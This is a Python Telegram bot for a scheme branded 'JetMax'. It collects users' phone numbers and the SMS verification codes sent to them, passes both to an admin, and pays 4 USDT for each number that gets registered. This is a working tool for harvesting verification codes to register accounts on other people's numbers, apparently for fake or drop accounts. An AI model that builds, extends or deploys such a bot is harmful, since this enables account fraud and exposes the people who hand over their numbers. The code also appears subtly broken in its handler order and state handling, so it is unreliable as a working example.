import asyncio
import asyncpg
import os
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHANNEL_URL = os.getenv("CHANNEL_URL")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
DATABASE_URL = os.getenv("DATABASE_URL")

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

class Form(StatesGroup):
    waiting_number = State()
    waiting_sms = State()

db_pool = None

async def init_db():
    global db_pool
    print("[DB] Подключение к базе данных...")
    db_pool = await asyncpg.create_pool(DATABASE_URL)
    async with db_pool.acquire() as conn:
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                username TEXT,
                current_number TEXT,
                number_timestamp BIGINT,
                balance DECIMAL(10,2) DEFAULT 0.00
            )
        ''')
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS requests (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                username TEXT,
                number TEXT,
                status TEXT,
                created_at BIGINT
            )
        ''')
        await conn.execute('''
            CREATE TABLE IF NOT EXISTS approved_requests (
                id SERIAL PRIMARY KEY,
                user_id BIGINT,
                username TEXT,
                number TEXT,
                request_number INTEGER,
                created_at BIGINT
            )
        ''')
    print("[DB] Таблицы созданы")

def get_main_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="💰 Баланс")]],
        resize_keyboard=True
    )
    return keyboard

def get_chat_id():
    url = CHANNEL_URL
    if url.startswith("https://t.me/"):
        username = url.replace("https://t.me/", "")
        return f"@{username}"
    elif url.startswith("@"):
        return url
    else:
        return int(url)

def get_channel_link():
    url = CHANNEL_URL
    if url.startswith("https://t.me/"):
        return url
    elif url.startswith("@"):
        return f"https://t.me/{url[1:]}"
    else:
        return f"https://t.me/c/{str(url).replace('-100', '')}"

@dp.message()
async def catch_all_messages(message: types.Message, state: FSMContext):
    print(f"[CATCH_ALL] Сообщение от {message.from_user.id}: '{message.text}'")
    
    current_state = await state.get_state()
    print(f"[CATCH_ALL] Текущее состояние: {current_state}")
    
    if current_state == Form.waiting_number.state:
        print(f"[CATCH_ALL] Это сообщение для waiting_number! Обрабатываю...")
        await process_number(message, state)
    else:
        await message.answer(f"✅ Бот получил: {message.text}")

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    print(f"[START] Пользователь {message.from_user.id} запустил бота")
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.full_name
    async with db_pool.acquire() as conn:
        await conn.execute('''
            INSERT INTO users (user_id, username) VALUES ($1, $2)
            ON CONFLICT (user_id) DO UPDATE SET username = $2
        ''', user_id, username)
    
    channel_link = get_channel_link()
    
    await message.answer(
        f"<b>🔐 JetMax - твое богатое будущее!</b>\n<i>Для дальнейшей работы с ботом подпишитесь на канал:</i> {channel_link}",
        reply_markup=get_main_keyboard(),
        parse_mode="HTML"
    )
    print(f"[START] Ответ отправлен пользователю {user_id}")

@dp.message(F.text == "💰 Баланс")
async def show_balance(message: types.Message):
    print(f"[BALANCE] Запрос баланса от {message.from_user.id}")
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT balance FROM users WHERE user_id = $1", message.from_user.id)
        balance = row["balance"] if row else 0.00
    await message.answer(
        f"<b>💳 Ваш текущий баланс:</b>\n<code>{balance:.2f} USDT</code>",
        parse_mode="HTML"
    )
    print(f"[BALANCE] Баланс {balance} отправлен пользователю {message.from_user.id}")

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    print(f"[ADMIN] Запрос админ панели от {message.from_user.id}")
    if message.from_user.id != ADMIN_ID:
        await message.answer("<b>⛔ Доступ запрещен</b>", parse_mode="HTML")
        print(f"[ADMIN] Доступ запрещен для {message.from_user.id}")
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Создать заявку", callback_data="admin_create")],
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")]
    ])
    await message.answer(
        "<b>👨‍💼 Админ панель</b>\n<i>Выберите действие:</i>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    print(f"[ADMIN] Панель отправлена админу {message.from_user.id}")

@dp.callback_query(F.data == "admin_create")
async def admin_create(callback: types.CallbackQuery):
    print(f"[ADMIN_CREATE] Админ {callback.from_user.id} создает заявку")
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещен")
        return
    
    chat_id = get_chat_id()
    print(f"[ADMIN_CREATE] Отправка в канал: {chat_id}")
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Сдать номер", callback_data="send_number")]
    ])
    
    try:
        await bot.send_message(
            chat_id,
            "<b>💼 Требуется номер для работы!</b>\n<i>⏱️ Нажмите кнопку снизу для сдачи</i>",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        print(f"[ADMIN_CREATE] Заявка успешно создана")
        await callback.answer("✅ Заявка создана")
    except Exception as e:
        print(f"[ADMIN_CREATE] Ошибка: {e}")
        await callback.answer("❌ Ошибка")
        await callback.message.answer(f"<b>❌ Ошибка:</b>\n<code>{e}</code>", parse_mode="HTML")

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    print(f"[ADMIN_STATS] Админ {callback.from_user.id} запросил статистику")
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("Доступ запрещен")
        return
    
    async with db_pool.acquire() as conn:
        users_count = await conn.fetchval("SELECT COUNT(*) FROM users")
        approved_count = await conn.fetchval("SELECT COUNT(*) FROM approved_requests")
        active_requests = await conn.fetchval("SELECT COUNT(*) FROM requests")
        total_payout = await conn.fetchval("SELECT SUM(balance) FROM users")
    
    print(f"[ADMIN_STATS] Статистика: users={users_count}, approved={approved_count}, active={active_requests}, payout={total_payout}")
    
    await callback.message.answer(
        f"<b>📊 Статистика</b>\n\n"
        f"<i>👥 Пользователей:</i> <code>{users_count}</code>\n"
        f"<i>✅ Выполнено заявок:</i> <code>{approved_count}</code>\n"
        f"<i>🔄 Активных заявок:</i> <code>{active_requests}</code>\n"
        f"<i>💰 Выплачено:</i> <code>{total_payout or 0:.2f} USDT</code>",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "send_number")
async def call_send_number(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    username = callback.from_user.username or callback.from_user.full_name
    
    print(f"[SEND_NUMBER] Пользователь {user_id} нажал кнопку Сдать номер")
    
    async with db_pool.acquire() as conn:
        user = await conn.fetchrow("SELECT current_number, number_timestamp FROM users WHERE user_id = $1", user_id)
        if user and user["current_number"]:
            last_time = user["number_timestamp"]
            if last_time:
                elapsed = int(time.time()) - last_time
                if elapsed < 600:
                    remaining = 600 - elapsed
                    minutes = remaining // 60
                    seconds = remaining % 60
                    print(f"[SEND_NUMBER] Таймер ожидания для {user_id}: {minutes}:{seconds}")
                    await bot.send_message(
                        user_id,
                        f"<b>⏳ Этот номер недавно обрабатывался</b>\n<i>Его можно поставить повторно только через</i> <code>{minutes:02d}:{seconds:02d}</code>",
                        parse_mode="HTML"
                    )
                    await callback.answer()
                    return
    
    await state.set_state(Form.waiting_number)
    await state.update_data(user_id=user_id, username=username)
    
    current_state = await state.get_state()
    print(f"[SEND_NUMBER] Состояние установлено: {current_state} для пользователя {user_id}")
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отменить", callback_data="cancel_request")]
    ])
    
    await bot.send_message(
        user_id,
        "<b>⏱️ Заявка принята!</b>\n<i>Отправьте ниже свой номер в любом формате</i>\n<i>Таймер на выполнение:</i> <code>1 мин</code>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    print(f"[SEND_NUMBER] Сообщение отправлено пользователю {user_id}, ожидаем номер")
    await callback.answer()

@dp.callback_query(F.data == "cancel_request")
async def cancel_request(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    username = callback.from_user.username or callback.from_user.full_name
    print(f"[CANCEL] Пользователь {user_id} отменил заявку")
    
    await state.clear()
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
    
    await callback.message.answer("<b>❌ Заявка отменена</b>", parse_mode="HTML")
    await bot.send_message(
        ADMIN_ID,
        f"<b>🔐 Заявка отменена!</b>\n<i>Пользователь:</i> @{username} [<code>{user_id}</code>]",
        parse_mode="HTML"
    )
    await callback.answer()

async def process_number(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    print(f"[PROCESS_NUMBER] ВХОД В ОБРАБОТЧИК от {user_id}")
    print(f"[PROCESS_NUMBER] Текст сообщения: {message.text}")
    
    number = message.text.strip()
    
    data = await state.get_data()
    print(f"[PROCESS_NUMBER] Данные из state: {data}")
    
    username = data.get("username", message.from_user.username or message.from_user.full_name)
    
    async with db_pool.acquire() as conn:
        await conn.execute('''
            UPDATE users SET current_number = $1, number_timestamp = $2 WHERE user_id = $3
        ''', number, int(time.time()), user_id)
        await conn.execute('''
            INSERT INTO requests (user_id, username, number, status, created_at) 
            VALUES ($1, $2, $3, 'waiting_sms', $4)
        ''', user_id, username, number, int(time.time()))
    
    await state.clear()
    print(f"[PROCESS_NUMBER] Состояние очищено")
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Запросить смс", callback_data=f"request_sms_{user_id}"),
         InlineKeyboardButton(text="Отклонить заявку", callback_data=f"reject_{user_id}")]
    ])
    
    await bot.send_message(
        ADMIN_ID,
        f"<b>💼 Новая заявка от @{username} (ID: {user_id})</b>\n<i>Номер:</i> <code>{number}</code>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    print(f"[PROCESS_NUMBER] Заявка отправлена админу {ADMIN_ID}")
    
    await message.answer("<b>✅ Номер принят</b>\n<i>Ожидайте решения администратора</i>", parse_mode="HTML")
    print(f"[PROCESS_NUMBER] Ответ отправлен пользователю {user_id}")

@dp.callback_query(F.data.startswith("request_sms_"))
async def request_sms(callback: types.CallbackQuery, state: FSMContext):
    user_id = int(callback.data.split("_")[2])
    print(f"[REQUEST_SMS] Админ запросил смс для пользователя {user_id}")
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отменить", callback_data="cancel_sms")]
    ])
    
    await bot.send_message(
        user_id,
        "<b>⏱️ Введите код из смс!</b>\n<i>Таймер на выполнение:</i> <code>1 мин</code>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    
    await state.set_state(Form.waiting_sms)
    await state.update_data(user_id=user_id)
    print(f"[REQUEST_SMS] Состояние waiting_sms установлено для {user_id}")
    await callback.answer("Запрос отправлен")

@dp.callback_query(F.data.startswith("reject_"))
async def reject_request(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    print(f"[REJECT] Админ отклонил заявку пользователя {user_id}")
    
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
    
    await bot.send_message(
        user_id,
        "<b>🔐 Заявка отклонена!</b>\n<i>Причина: отклонена администрацией</i>",
        parse_mode="HTML"
    )
    await callback.answer("Заявка отклонена")
    await callback.message.delete_reply_markup()

@dp.message(Form.waiting_sms)
async def process_sms(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    sms_code = message.text.strip()
    
    print(f"[PROCESS_SMS] ВХОД В ОБРАБОТЧИК смс от {user_id}")
    print(f"[PROCESS_SMS] Код: {sms_code}")
    
    data = await state.get_data()
    if data.get("user_id") != user_id:
        print(f"[PROCESS_SMS] user_id не совпадает: {data.get('user_id')} != {user_id}")
        return
    
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT number FROM requests WHERE user_id = $1", user_id)
        if not row:
            print(f"[PROCESS_SMS] Заявка не найдена для {user_id}")
            await message.answer("<b>❌ Заявка не найдена</b>", parse_mode="HTML")
            await state.clear()
            return
    
    username = message.from_user.username or message.from_user.full_name
    await state.clear()
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Номер встал", callback_data=f"accept_{user_id}_{sms_code}"),
         InlineKeyboardButton(text="Номер Зарегистрирован", callback_data=f"registered_{user_id}"),
         InlineKeyboardButton(text="Получена ошибка", callback_data=f"error_{user_id}")]
    ])
    
    await bot.send_message(
        ADMIN_ID,
        f"<b>👨‍💻 Получен код!</b>\n<i>Пользователь:</i> @{username} [<code>{user_id}</code>]\n<i>Код:</i> <code>{sms_code}</code>",
        reply_markup=keyboard,
        parse_mode="HTML"
    )
    print(f"[PROCESS_SMS] Код отправлен админу {ADMIN_ID}")
    
    await message.answer("<b>✅ Код отправлен администратору</b>", parse_mode="HTML")

@dp.callback_query(F.data.startswith("accept_"))
async def number_accepted(callback: types.CallbackQuery):
    parts = callback.data.split("_")
    user_id = int(parts[1])
    sms_code = parts[2]
    
    print(f"[ACCEPT] Админ принял номер пользователя {user_id}, код {sms_code}")
    
    async with db_pool.acquire() as conn:
        row = await conn.fetchrow("SELECT number FROM requests WHERE user_id = $1", user_id)
        if not row:
            await callback.answer("Заявка не найдена")
            return
        number = row["number"]
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
        count = await conn.fetchval("SELECT COUNT(*) FROM approved_requests")
        request_number = 12 + count
        username = callback.from_user.username or callback.from_user.full_name
        await conn.execute('''
            INSERT INTO approved_requests (user_id, username, number, request_number, created_at)
            VALUES ($1, $2, $3, $4, $5)
        ''', user_id, username, number, request_number, int(time.time()))
        await conn.execute("UPDATE users SET balance = balance + 4.00 WHERE user_id = $1", user_id)
    
    await bot.send_message(
        user_id,
        f"<b>🎉 Номер принят!</b>\n<i>Вам успешно</i> <code>4.0$</code> <i>на баланс</i>\n\n<i>Номер заявки:</i> <code>#{request_number}</code>",
        parse_mode="HTML"
    )
    print(f"[ACCEPT] Пользователю {user_id} начислено 4$, номер заявки {request_number}")
    await callback.answer("Номер принят")
    await callback.message.delete_reply_markup()

@dp.callback_query(F.data.startswith("registered_"))
async def number_registered(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    print(f"[REGISTERED] Админ отметил номер пользователя {user_id} как зарегистрированный")
    
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
    
    await bot.send_message(
        user_id,
        "<b>🔐 Номер уже зарегистрирован!</b>\n<i>Ожидайте создания следующей заявки в канале</i>",
        parse_mode="HTML"
    )
    await callback.answer("Номер зарегистрирован")
    await callback.message.delete_reply_markup()

@dp.callback_query(F.data.startswith("error_"))
async def got_error(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[1])
    print(f"[ERROR] Админ получил ошибку для пользователя {user_id}")
    
    await callback.message.answer("<b>Введите причину ошибки:</b>", parse_mode="HTML")
    await callback.answer()
    
    @dp.message
    async def get_error_reason(message: types.Message):
        if message.from_user.id != ADMIN_ID:
            return
        reason = message.text
        print(f"[ERROR] Причина: {reason}")
        async with db_pool.acquire() as conn:
            await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
        await bot.send_message(
            user_id,
            f"<b>🔐 {reason}</b>",
            parse_mode="HTML"
        )
        await message.answer("<b>✅ Причина отправлена</b>", parse_mode="HTML")
        dp.message.handlers.remove(get_error_reason)

@dp.callback_query(F.data == "cancel_sms")
async def cancel_sms(callback: types.CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    print(f"[CANCEL_SMS] Пользователь {user_id} отменил ввод смс")
    
    await state.clear()
    async with db_pool.acquire() as conn:
        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
    await callback.message.answer("<b>❌ Заявка отменена</b>", parse_mode="HTML")
    await callback.answer()

async def main():
    print("[MAIN] Запуск бота...")
    await init_db()
    await bot.delete_webhook(drop_pending_updates=True)
    print("[MAIN] Webhook очищен")
    print("[MAIN] Бот запущен и готов к работе!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
